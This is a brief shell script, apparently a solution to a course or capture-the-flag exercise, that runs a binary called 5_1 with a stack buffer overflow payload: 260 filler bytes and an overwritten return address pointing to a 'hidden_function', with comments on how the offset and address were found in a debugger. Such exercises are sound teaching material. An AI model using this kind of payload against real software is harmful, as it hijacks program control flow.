#!/bin/sh
./5_1 `python -c 'print "A"*260 + "\x1c\x05\x01\x00"'`

# 260 is subtracted from fp and address is found using:
# $ info line hidden_function
# The return address is 0x1051c

